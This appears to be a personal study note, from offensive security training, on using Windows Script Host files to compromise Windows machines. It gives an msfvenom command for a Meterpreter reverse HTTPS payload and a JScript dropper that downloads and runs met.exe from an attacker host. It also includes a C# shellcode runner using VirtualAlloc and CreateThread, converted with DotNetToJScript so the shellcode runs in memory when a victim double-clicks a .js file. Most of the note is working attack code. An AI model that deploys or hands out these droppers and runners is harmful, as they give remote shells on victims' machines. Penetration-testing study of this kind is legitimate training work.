---
creation date: December 21st 2022
last modified date: December 21st 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Windows Script Host]]  
___

## Description:  
Look for default apps in windows settings, if the default application for .js files is Windows-Based Script host (should be by default), then our code should run automatically after a double-click.

### Jscript
use msfvenom to generate a 64-bit Meterpreter reverse HTTPS executable named met.exe:
```
kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o met.exe
```
Now create the dropper code (save as a .js):
```
var url = "http://192.168.119.120/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{ 
	var Stream = WScript.CreateObject('ADODB.Stream');

	Stream.Open();
	Stream.Type = 1; // adTypeBinary
	Stream.Write(Object.ResponseBody);
	Stream.Position = 0;

	Stream.SaveToFile("met.exe", 2);
	Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```
After saving this code as a .js file, all we need to do is double-click it to get a 64-bit shell from the victim’s machine to our awaiting multi/handler listener.

### Using Jscript and C sharp
To run our payload completely from memory

Download [DotNetToJScript](https://github.com/tyranid/DotNetToJScript) and open it in visual studio
open TestClass.cs under the ExampleAssembly project. We’ll compile this as a .dll assembly, which we’ll execute in Jscript.
```
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
[ComVisible(true)]
public class TestClass
{
	public TestClass()
	 {
		 MessageBox.Show("Test", "Test", MessageBoxButtons.OK, 
		MessageBoxIcon.Exclamation);
	 }
	 public void RunProcess(string path)
	 {
	 Process.Start(path);
	 }
}
```
Jscript will eventually execute the content of the TestClass method, which is inside the TestClass class (`MessageBox.Show`).
To test this solution, switch from debug to release mode and compile the entire solution (Build solutions). Place NDesk.Options.dll and ExampleAssembly.dll next to DotNetToJscript.exe and run the following command to create your .js file:
```
C:\Tools> DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
```
Double click the .js file to run it, you should receive a popup that says "test".

We now need to get this project working with our shellcode.

Generate a 64-bit Meterpreter staged payload in csharp format and set up our multi/handler with the same payload.
```
kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f csharp
```

We must modify the ExampleAssembly project in DotNetToJscript to execute the shellcode runner. Add the needed namespaces at the beginning of the project with the "using" keyword.

```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
[ComVisible(true)]
public class TestClass
{
 [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
 static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
 uint flAllocationType, uint flProtect);
 [DllImport("kernel32.dll")]
 static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
 IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr 
lpThreadId);
 [DllImport("kernel32.dll")]
 static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

public TestClass()
{
 byte[] buf = new byte[626] {
 0xfc,0x48,0x83,0xe4,0xf0,0xe8...
 int size = buf.Length;
 IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
 Marshal.Copy(buf, 0, addr, size);
 IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, 
IntPtr.Zero);
 WaitForSingleObject(hThread, 0xFFFFFFFF);
}
	 public void RunProcess(string path)
	 {
	 Process.Start(path);
	 }
}
```
Before compiling this project, we must set the CPU architecture to x64 since we are using 64-bit shellcode. This is done through the CPU drop down menu, where we open the Configuration Manager. In the Configuration Manager, we choose <New…> from the Platform drop down menu and accept the new platform as x64.

Place NDesk.Options.dll and ExampleAssembly.dll next to DotNetToJscript.exe and run the following command to create your .js file:
```
C:\Tools> DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
```
With our multi/handler set up, we can double-click the Jscript file. After a brief pause, we should receive the staged reverse Meterpreter shell.

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 21st 2022 (05:46 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
